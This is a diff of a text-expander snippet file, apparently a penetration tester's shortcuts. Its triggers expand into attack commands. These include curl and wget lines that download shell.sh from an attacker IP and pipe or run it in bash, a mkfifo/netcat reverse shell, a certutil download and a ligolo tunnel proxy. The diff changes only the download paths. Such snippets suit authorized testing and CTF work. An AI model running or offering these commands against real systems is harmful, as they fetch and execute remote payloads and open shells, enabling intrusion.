@@ -109,7 +109,7 @@ matches:
     replace: curl http://{{IP}}/shell.sh | bash
                                                                                 
   - trigger: ":rwget"                                                           
-    replace: wget http://192.168.174.150/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+    replace: wget http://192.168.174.150/linux/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
 
   - trigger: ":mkfifo"                                                          
     replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
@@ -147,7 +147,7 @@ matches:
     replace: wget http://{{IP}}/
     
   - trigger: ":certutil"
-    replace: certutil.exe -urlcache -split -f http://{{IP}}/
+    replace: certutil.exe -urlcache -split -f http://{{IP}}/windows/
   
   - trigger: ":pligolo"
     replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443
